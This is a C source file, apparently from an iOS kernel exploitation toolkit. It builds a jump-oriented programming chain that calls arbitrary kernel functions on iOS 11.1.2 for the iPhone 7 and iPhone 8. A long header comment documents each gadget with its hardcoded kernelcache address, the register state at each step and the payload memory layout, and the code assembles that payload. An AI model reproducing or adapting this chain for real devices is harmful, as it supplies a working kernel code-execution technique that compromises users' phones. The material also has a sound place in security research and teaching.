/*
 * Arm64 Kernel Function Call Strategy 5
 * -------------------------------------
 *
 *  This is a variant of call strategy 3 that supports the iOS 11.1.2 kernelcache for the iPhone 7
 *  and iPhone 8.
 *
 *  -----------------------------------------------------------------------------------------------
 *
 *  	kernel_call_2
 *  		REGION_POPULATE_VALUES = {
 *  			  0: REGION_1
 *  			  8: ARGUMENT_0
 *  			 10: ARGUMENT_13
 *  			 18: REGION_ARGUMENTS_2_TO_11
 *  			 20: ARGUMENT_1
 *  			 28: FUNCTION
 *  			 30: GADGET_CALL_FUNCTION_1
 *  			 38: GADGET_POPULATE_2
 *  			 40
 *  			 48: ARGUMENT_12
 *  			 c0: JOP_STACK_2
 *  			268: REGION_2
 *  			288: <-RESULT
 *  		}
 *  		REGION_1 = {
 *  			 a0: JOP_DISPATCH
 *  			 d0: GADGET_STORE_RESULT_2
 *  			390: JOP_DISPATCH
 *  		}
 *  		REGION_ARGUMENTS_2_TO_11 = {
 *  			 0: ARGUMENT_2
 *  			 8: ARGUMENT_3
 *  			10: ARGUMENT_4
 *  			18: ARGUMENT_5
 *  			20: ARGUMENT_6
 *  			28: ARGUMENT_7
 *  			30: ARGUMENT_8
 *  			38: ARGUMENT_9
 *  			40: ARGUMENT_10
 *  			48: ARGUMENT_11
 *  		}
 *  		REGION_2 = {
 *  			0: REGION_3
 *  		}
 *  		REGION_3 = {
 *  			158: GADGET_EPILOGUE_2
 *  		}
 *  		JOP_STACK_1 = [
 *  			MOV_X23_X19__BR_X8
 *  			GADGET_INITIALIZE_X20_1
 *  			MOV_X25_X19__BR_X8
 *  			GADGET_POPULATE_2
 *  		]
 *  		JOP_STACK_2 = [
 *  			MOV_X19_X3__BR_X8
 *  			MOV_X20_X6__BLR_X8
 *  			MOV_X21_X4__BLR_X8
 *  			MOV_X22_X12__BLR_X8
 *  			MOV_X23_X5__BR_X8
 *  			MOV_X24_X7__BLR_X8
 *  			MOV_X8_X9__BR_X10
 *  		]
 *  		x0 = REGION_POPULATE_VALUES
 *  		x1 = JOP_STACK_1
 *  		pc = GADGET_PROLOGUE_1
 *
 *  	GADGET_PROLOGUE_2 (0xfffffff0066012a0):
 *  			;; Save registers x19-x28, save the frame (x29, x30), and make
 *  			;; room for 0x40 bytes of local variables. sp must be
 *  			;; preserved until the epilogue.
 *  			sub sp, sp, #0xa0
 *  			stp x28, x27, [sp, #0x40]
 *  			stp x26, x25, [sp, #0x50]
 *  			stp x24, x23, [sp, #0x60]
 *  			stp x22, x21, [sp, #0x70]
 *  			stp x20, x19, [sp, #0x80]
 *  			stp x29, x30, [sp, #0x90]
 *  			add x29, sp, #0x90
 *  			mov x19, x0
 *  			ldr x8, [x19]
 *  			ldr x8, [x8, #0x390]
 *  			blr x8
 *  		SAVE_REGISTERS(x19, ..., x28)
 *  		x29 = STACK_FRAME()
 *  		RESERVE_STACK(0x40)
 *  		x19 = REGION_POPULATE_VALUES
 *  		x8 = REGION_POPULATE_VALUES[0] = REGION_1
 *  		x8 = REGION_1[0x390] = JOP_DISPATCH
 *  		pc = JOP_DISPATCH
 *
 *  	;; Just after the prologue we have the following register values:
 *  	;; 	x0 = REGION_POPULATE_VALUES
 *  	;; 	x1 = JOP_STACK_1
 *  	;; 	x8 = JOP_DISPATCH
 *  	;; 	x19 = REGION_POPULATE_VALUES
 *  	;; 	x29 = FRAME
 *  	;; We will populate registers using GADGET_POPULATE_2. Since we're using this
 *  	;; gadget with JOP_DISPATCH, we first need to initialize x20 to JOP_STACK_2 and
 *  	;; x23 to REGION_POPULATE_VALUES.
 *
 *  	JOP_DISPATCH (0xfffffff006a4e1a8):
 *  			ldp x2, x1, [x1]
 *  			br x2
 *  		x2 = MOV_X23_X19__BR_X8
 *  		pc = MOV_X23_X19__BR_X8
 *
 *  	MOV_X23_X19__BR_X8 (0xfffffff00674c99c)
 *  			mov x23, x19
 *  			br x8
 *  		x23 = REGION_POPULATE_VALUES
 *  		pc = JOP_DISPATCH
 *  		x2 = GADGET_INITIALIZE_X20_1
 *  		pc = GADGET_INITIALIZE_X20_1
 *
 *  	GADGET_INITIALIZE_X20_1 (0xfffffff006291d34):
 *  			;; This is a hack to get x20 to point to JOP_STACK_2 before
 *  			;; using GADGET_POPULATE_2.
 *  			ldr x20, [x19, #0xc0]
 *  			ldr x8, [x0]
 *  			ldr x8, [x8, #0xa0]
 *  			blr x8
 *  		x20 = REGION_POPULATE_VALUES[0xc0] = JOP_STACK_2
 *  		x8 = REGION_POPULATE_VALUES[0] = REGION_1
 *  		x8 = REGION_1[0xa0] = JOP_DISPATCH
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X25_X19__BR_X8
 *  		pc = MOV_X25_X19__BR_X8
 *
 *  	;; We're about to execute GADGET_POPULATE_2. We want to fill the following
 *  	;; registers:
 *  	;; 	x19 = ARGUMENT_0
 *  	;; 	x20 = ARGUMENT_1
 *  	;; 	x21 = ARGUMENT_13
 *  	;; 	x22 = ARGUMENT_12
 *  	;; 	x23 = REGION_ARGUMENTS_2_TO_11
 *  	;;	x24 = FUNCTION
 *  	;; 	x25 = REGION_POPULATE_VALUES (CALL_RESUME)
 *  	;; Last of all we want to set:
 *  	;; 	x8 = GADGET_CALL_FUNCTION_1
 *  	;; 	pc = GADGET_POPULATE_2
 *  	;; The GADGET_POPULATE_2 gadget will give us control of the following
 *  	;; registers:
 *  	;; 	x3, x4, x5, x6, x7, x9, x10, x11, x12
 *  	;; Since we already have REGION_POPULATE_VALUES in x19, we'll set x25 now.
 *
 *  	MOV_X25_X19__BR_X8 (0xfffffff006707570):
 *  			mov x25, x19
 *  			br x8
 *  		x25 = REGION_POPULATE_VALUES
 *  		pc = JOP_DISPATCH
 *  		x2 = GADGET_POPULATE_2
 *  		pc = GADGET_POPULATE_2
 *
 *  	GADGET_POPULATE_2 (0xfffffff006ce40e4):
 *  			ldp x2, x3, [x23]
 *  			ldp x4, x5, [x23, #0x10]
 *  			ldp x6, x7, [x23, #0x20]
 *  			ldp x9, x10, [x23, #0x30]
 *  			ldp x11, x12, [x23, #0x40]
 *  			stp x22, x21, [sp, #0x20]
 *  			stp x11, x12, [sp, #0x10]
 *  			stp x9, x10, [sp]
 *  			mov x0, x19
 *  			mov x1, x20
 *  			blr x8
 *  		x0 = REGION_POPULATE_VALUES
 *  		x1 = JOP_STACK_2
 *  		x2 = REGION_POPULATE_VALUES[0] = REGION_1
 *  		x3 = REGION_POPULATE_VALUES[0x8] = ARGUMENT_0
 *  		x4 = REGION_POPULATE_VALUES[0x10] = ARGUMENT_13
 *  		x5 = REGION_POPULATE_VALUES[0x18] = REGION_ARGUMENTS_2_TO_11
 *  		x6 = REGION_POPULATE_VALUES[0x20] = ARGUMENT_1
 *  		x7 = REGION_POPULATE_VALUES[0x28] = FUNCTION
 *  		x9 = REGION_POPULATE_VALUES[0x30] = GADGET_CALL_FUNCTION_1
 *  		x10 = REGION_POPULATE_VALUES[0x38] = GADGET_POPULATE_2
 *  		x11 = REGION_POPULATE_VALUES[0x40]
 *  		x12 = REGION_POPULATE_VALUES[0x48] = ARGUMENT_12
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X19_X3__BR_X8
 *  		pc = MOV_X19_X3__BR_X8
 *
 *  	;; Now that we've populated the registers, we just need to move the values to
 *  	;; where they belong.
 *
 *  	MOV_X19_X3__BR_X8 (0xfffffff0068804cc):
 *  			mov x19, x3
 *  			br x8
 *  		x19 = ARGUMENT_0
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X20_X6__BLR_X8
 *  		pc = MOV_X20_X6__BLR_X8
 *
 *  	MOV_X20_X6__BLR_X8 (0xfffffff0070e3738):
 *  			mov x20, x6
 *  			blr x8
 *  		x20 = ARGUMENT_1
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X21_X4__BLR_X8
 *  		pc = MOV_X21_X4__BLR_X8
 *
 *  	MOV_X21_X4__BLR_X8 (0xfffffff00677a398):
 *  			mov x21, x4
 *  			blr x8
 *  		x21 = ARGUMENT_13
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X22_X12__BLR_X8
 *  		pc = MOV_X22_X12__BLR_X8
 *
 *  	MOV_X22_X12__BLR_X8 (0xfffffff0067f9dfc):
 *  			mov x22, x12
 *  			blr x8
 *  		x22 = ARGUMENT_12
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X23_X5__BR_X8
 *  		pc = MOV_X23_X5__BR_X8
 *
 *  	MOV_X23_X5__BR_X8 (0xfffffff00678bdbc):
 *  			mov x23, x5
 *  			br x8
 *  		x23 = REGION_ARGUMENTS_2_TO_11
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X24_X7__BLR_X8
 *  		pc = MOV_X24_X7__BLR_X8
 *
 *  	MOV_X24_X7__BLR_X8 (0xfffffff006879350):
 *  			mov x24, x7
 *  			blr x8
 *  		x24 = FUNCTION
 *  		pc = JOP_DISPATCH
 *  		x2 = MOV_X8_X9__BR_X10
 *  		pc = MOV_X8_X9__BR_X10
 *
 *  	MOV_X8_X9__BR_X10 (0xfffffff0067163d0):
 *  			mov x8, x9
 *  			br x10
 *  		x8 = GADGET_CALL_FUNCTION_1
 *  		pc = GADGET_POPULATE_2
 *
 *  	;; At this point, we have set the following registers:
 *  	;; 	x8 = GADGET_CALL_FUNCTION_1
 *  	;; 	x19 = ARGUMENT_0
 *  	;; 	x20 = ARGUMENT_1
 *  	;; 	x21 = ARGUMENT_13
 *  	;; 	x22 = ARGUMENT_12
 *  	;; 	x23 = REGION_ARGUMENTS_2_TO_11
 *  	;;	x24 = FUNCTION
 *  	;; 	x25 = REGION_POPULATE_VALUES
 *  	;; 	pc = GADGET_POPULATE_2
 *
 *  	GADGET_POPULATE_2 (0xfffffff006ce40e4):
 *  			ldp x2, x3, [x23]
 *  			ldp x4, x5, [x23, #0x10]
 *  			ldp x6, x7, [x23, #0x20]
 *  			ldp x9, x10, [x23, #0x30]
 *  			ldp x11, x12, [x23, #0x40]
 *  			stp x22, x21, [sp, #0x20]
 *  			stp x11, x12, [sp, #0x10]
 *  			stp x9, x10, [sp]
 *  			mov x0, x19
 *  			mov x1, x20
 *  			blr x8
 *  		x0 = ARGUMENT_0
 *  		x1 = ARGUMENT_1
 *  		x2 = ARGUMENT_2
 *  		x3 = ARGUMENT_3
 *  		x4 = ARGUMENT_4
 *  		x5 = ARGUMENT_5
 *  		x6 = ARGUMENT_6
 *  		x7 = ARGUMENT_7
 *  		x9 = ARGUMENT_8
 *  		x10 = ARGUMENT_9
 *  		x11 = ARGUMENT_10
 *  		x12 = ARGUMENT_11
 *  		STACK = [
 *  			ARGUMENT_8
 *  			ARGUMENT_9
 *  			ARGUMENT_10
 *  			ARGUMENT_11
 *  			ARGUMENT_12
 *  			ARGUMENT_13
 *  			?
 *  			?
 *  		]
 *  		pc = GADGET_CALL_FUNCTION_1
 *
 *  	;; Now all the arguments are set up correctly and we will execute
 *  	;; GADGET_CALL_FUNCTION_1. The following gadget allows us to resume execution
 *  	;; after the function call without messing with x30.
 *
 *  	GADGET_CALL_FUNCTION_1 (0xfffffff00753ac98):
 *  			blr x24
 *  			mov x19, x0
 *  			ldr x8, [x25]
 *  			ldr x8, [x8, #0xd0]
 *  			mov x0, x25
 *  			blr x8
 *  		pc = FUNCTION
 *  		x0 = RESULT
 *  		x19 = RESULT
 *  		x8 = REGION_POPULATE_VALUES[0] = REGION_1
 *  		x8 = REGION_1[0xd0] = GADGET_STORE_RESULT_2
 *  		x0 = REGION_POPULATE_VALUES
 *  		pc = GADGET_STORE_RESULT_2
 *
 *  	GADGET_STORE_RESULT_2 (0xfffffff00629ee70):
 *  			str x19, [x0, #0x288]
 *  			ldr x0, [x0, #0x268]
 *  			ldr x8, [x0]
 *  			ldr x8, [x8, #0x158]
 *  			blr x8
 *  		REGION_POPULATE_VALUES[0x288] = RESULT
 *  		x0 = REGION_POPULATE_VALUES[0x268] = REGION_2
 *  		x8 = REGION_2[0] = REGION_3
 *  		x8 = REGION_3[0x158] = GADGET_EPILOGUE_2
 *  		pc = GADGET_EPILOGUE_2
 *
 *  	GADGET_EPILOGUE_2 (0xfffffff0070ef450):
 *  			;; Reset stack to entry conditions and return to caller. sp
 *  			;; must have been preserved from the prologue.
 *  			ldp x29, x30, [sp, #0x90]
 *  			ldp x20, x19, [sp, #0x80]
 *  			ldp x22, x21, [sp, #0x70]
 *  			ldp x24, x23, [sp, #0x60]
 *  			ldp x26, x25, [sp, #0x50]
 *  			ldp x28, x27, [sp, #0x40]
 *  			add sp, sp, #0xa0
 *  			ret
 *  		RESTORE_REGISTERS(x19, ..., x28)
 *  		pc = CALLER
 *
 *  -----------------------------------------------------------------------------------------------
 *
 *  	         0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
 *  	        +----------------------------------------------------------------+
 *  	      0 |BB          BBAAAAAAAAAAAAAAAA  AACCCCCCCCCCCCCCCCCCCCDDEE    AA|
 *  	    100 |JJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKKKKKKKKKKKKK                    |
 *  	    200 |                                        AA      **          BB  |
 *  	        +----------------------------------------------------------------+
 *  	         0   1   2   3   4   5   6   7   8   9   a   b   c   d   e   f
 *
 *  	        A = REGION_POPULATE_VALUES   =   0 - 270 @  38
 *  	        * = RESULT                   =   0 - 8   @ 288 + REGION_POPULATE_VALUES
 *  	        B = REGION_1                 =  a0 - 398 @ -a0
 *  	        C = REGION_ARGUMENTS_2_TO_11 =   0 - 50  @  88
 *  	        D = REGION_2                 =   0 - 8   @  d8
 *  	        E = REGION_3                 = 158 - 160 @ -78
 *
 *  	        J = JOP_STACK_1              =   0 - 40  @ 100
 *  	        K = JOP_STACK_2              =   0 - 70  @ 140
 *
 */

#include "arm64/jop/call_strategy.h"
#include "arm64/jop/gadgets_static.h"

#include <assert.h>
#include <unistd.h> // for ssize_t

static bool
check() {
#define NEED(gadget)					\
	if (static_gadgets[gadget].address == 0) {	\
		return false;				\
	}
	NEED(GADGET_PROLOGUE_2);
	NEED(LDP_X2_X1_X1__BR_X2); // JOP_DISPATCH
	NEED(MOV_X23_X19__BR_X8);
	NEED(GADGET_INITIALIZE_X20_1);
	NEED(MOV_X25_X19__BR_X8);
	NEED(GADGET_POPULATE_2);
	NEED(MOV_X19_X3__BR_X8);
	NEED(MOV_X20_X6__BLR_X8);
	NEED(MOV_X21_X4__BLR_X8);
	NEED(MOV_X22_X12__BLR_X8);
	NEED(MOV_X23_X5__BR_X8);
	NEED(MOV_X24_X7__BLR_X8);
	NEED(MOV_X8_X9__BR_X10);
	NEED(GADGET_CALL_FUNCTION_1);
	NEED(GADGET_STORE_RESULT_2);
	NEED(GADGET_EPILOGUE_2);
	return true;
#undef NEED
}

// Get the gadget by index, ensuring that it exists.
static inline uint64_t
gadget(unsigned gadget_index) {
	uint64_t address = static_gadgets[gadget_index].address;
	assert(address != 0);
	return address;
}

static void
build(uint64_t func, const uint64_t args[14], kaddr_t kernel_payload,
		void *payload0, struct jop_call_initial_state *initial_state,
		uint64_t *result_address) {
	uint8_t *payload = payload0;

	// Define the offsets from the start of the payload to each of the structures.
	const ssize_t REGION_POPULATE_VALUES_OFFSET   =   0x38;
	const ssize_t RESULT_OFFSET                   =  0x288 + REGION_POPULATE_VALUES_OFFSET;
	const ssize_t REGION_1_OFFSET                 = - 0xa0;
	const ssize_t REGION_ARGUMENTS_2_TO_11_OFFSET =   0x88;
	const ssize_t REGION_2_OFFSET                 =   0xd8;
	const ssize_t REGION_3_OFFSET                 = - 0x78;
	const ssize_t JOP_STACK_1_OFFSET              =  0x100;
	const ssize_t JOP_STACK_2_OFFSET              =  0x140;

	// Get the addresses of each region in the local buffer.
	uint8_t *payload_REGION_POPULATE_VALUES   = payload + REGION_POPULATE_VALUES_OFFSET;
	uint8_t *payload_REGION_1                 = payload + REGION_1_OFFSET;
	uint8_t *payload_REGION_ARGUMENTS_2_TO_11 = payload + REGION_ARGUMENTS_2_TO_11_OFFSET;
	uint8_t *payload_REGION_2                 = payload + REGION_2_OFFSET;
	uint8_t *payload_REGION_3                 = payload + REGION_3_OFFSET;
	uint8_t *payload_JOP_STACK_1              = payload + JOP_STACK_1_OFFSET;

	// Get the addresses of each region in the kernel.
	uint64_t kernel_REGION_POPULATE_VALUES   = kernel_payload + REGION_POPULATE_VALUES_OFFSET;
	uint64_t kernel_RESULT                   = kernel_payload + RESULT_OFFSET;
	uint64_t kernel_REGION_1                 = kernel_payload + REGION_1_OFFSET;
	uint64_t kernel_REGION_ARGUMENTS_2_TO_11 = kernel_payload + REGION_ARGUMENTS_2_TO_11_OFFSET;
	uint64_t kernel_REGION_2                 = kernel_payload + REGION_2_OFFSET;
	uint64_t kernel_REGION_3                 = kernel_payload + REGION_3_OFFSET;
	uint64_t kernel_JOP_STACK_1              = kernel_payload + JOP_STACK_1_OFFSET;
	uint64_t kernel_JOP_STACK_2              = kernel_payload + JOP_STACK_2_OFFSET;

	// Construct the REGION_POPULATE_VALUES region.
	*(uint64_t *)(payload_REGION_POPULATE_VALUES +   0x0) = kernel_REGION_1;
	*(uint64_t *)(payload_REGION_POPULATE_VALUES +   0x8) = args[0];
	*(uint64_t *)(payload_REGION_POPULATE_VALUES +  0x10) = args[13];
	*(uint64_t *)(payload_REGION_POPULATE_VALUES +  0x18) = kernel_REGION_ARGUMENTS_2_TO_11;
	*(uint64_t *)(payload_REGION_POPULATE_VALUES +  0x20) = args[1];
	*(uint64_t *)(payload_REGION_POPULATE_VALUES +  0x28) = func;
	*(uint64_t *)(payload_REGION_POPULATE_VALUES +  0x30) = gadget(GADGET_CALL_FUNCTION_1);
	*(uint64_t *)(payload_REGION_POPULATE_VALUES +  0x38) = gadget(GADGET_POPULATE_2);
	*(uint64_t *)(payload_REGION_POPULATE_VALUES +  0x48) = args[12];
	*(uint64_t *)(payload_REGION_POPULATE_VALUES +  0xc0) = kernel_JOP_STACK_2;
	*(uint64_t *)(payload_REGION_POPULATE_VALUES + 0x268) = kernel_REGION_2;

	// Construct the REGION_1 region.
	*(uint64_t *)(payload_REGION_1 +  0xa0) = gadget(LDP_X2_X1_X1__BR_X2);
	*(uint64_t *)(payload_REGION_1 +  0xd0) = gadget(GADGET_STORE_RESULT_2);
	*(uint64_t *)(payload_REGION_1 + 0x390) = gadget(LDP_X2_X1_X1__BR_X2);

	// Construct the REGION_ARGUMENTS_2_TO_11 region.
	*(uint64_t *)(payload_REGION_ARGUMENTS_2_TO_11 +   0x0) = args[2];
	*(uint64_t *)(payload_REGION_ARGUMENTS_2_TO_11 +   0x8) = args[3];
	*(uint64_t *)(payload_REGION_ARGUMENTS_2_TO_11 +  0x10) = args[4];
	*(uint64_t *)(payload_REGION_ARGUMENTS_2_TO_11 +  0x18) = args[5];
	*(uint64_t *)(payload_REGION_ARGUMENTS_2_TO_11 +  0x20) = args[6];
	*(uint64_t *)(payload_REGION_ARGUMENTS_2_TO_11 +  0x28) = args[7];
	*(uint64_t *)(payload_REGION_ARGUMENTS_2_TO_11 +  0x30) = args[8];
	*(uint64_t *)(payload_REGION_ARGUMENTS_2_TO_11 +  0x38) = args[9];
	*(uint64_t *)(payload_REGION_ARGUMENTS_2_TO_11 +  0x40) = args[10];
	*(uint64_t *)(payload_REGION_ARGUMENTS_2_TO_11 +  0x48) = args[11];

	// Construct the REGION_2 region.
	*(uint64_t *)(payload_REGION_2 +   0x0) = kernel_REGION_3;

	// Construct the REGION_3 region.
	*(uint64_t *)(payload_REGION_3 + 0x158) = gadget(GADGET_EPILOGUE_2);

	// Construct the JOP stacks. We can merge them together during construction, since the link
	// from JOP_STACK_1 to JOP_STACK_2 will be ignored during execution anyway.
	unsigned jop_chain[] = {
		// JOP_STACK_1
		MOV_X23_X19__BR_X8,
		GADGET_INITIALIZE_X20_1,
		MOV_X25_X19__BR_X8,
		GADGET_POPULATE_2,
		// JOP_STACK_2
		MOV_X19_X3__BR_X8,
		MOV_X20_X6__BLR_X8,
		MOV_X21_X4__BLR_X8,
		MOV_X22_X12__BLR_X8,
		MOV_X23_X5__BR_X8,
		MOV_X24_X7__BLR_X8,
		MOV_X8_X9__BR_X10,
	};
	struct JOP_DISPATCH_NODE {
		uint64_t x2;
		uint64_t x1;
	} *payload_JOP_DISPATCH_NODE = (void *) payload_JOP_STACK_1;
	uint64_t kernel_next_JOP_DISPATCH_NODE = kernel_JOP_STACK_1;
	for (size_t i = 0; i < ARRSIZE(jop_chain); i++) {
		kernel_next_JOP_DISPATCH_NODE += sizeof(*payload_JOP_DISPATCH_NODE);
		payload_JOP_DISPATCH_NODE->x2 = gadget(jop_chain[i]);
		payload_JOP_DISPATCH_NODE->x1 = kernel_next_JOP_DISPATCH_NODE;
		payload_JOP_DISPATCH_NODE++;
	}

	// Set the initial arguments.
	initial_state->pc   = gadget(GADGET_PROLOGUE_2);
	initial_state->x[0] = kernel_REGION_POPULATE_VALUES;
	initial_state->x[1] = kernel_JOP_STACK_1;

	// Set the address at which the result will be stored.
	*result_address = kernel_RESULT;
}

/*
 * jop_call_strategy_5
 *
 * Description:
 * 	The JOP payload described at the top of this file.
 *
 * Capabilities:
 * 	Supports 8 arguments passed in registers and 48 bytes of stack arguments.
 *
 * Platforms:
 * 	iOS 11.1.2 15B202: iPhone9,1, iPhone10,1
 */
struct jop_call_strategy jop_call_strategy_5 = {
	0x300, 0x30, check, build,
};

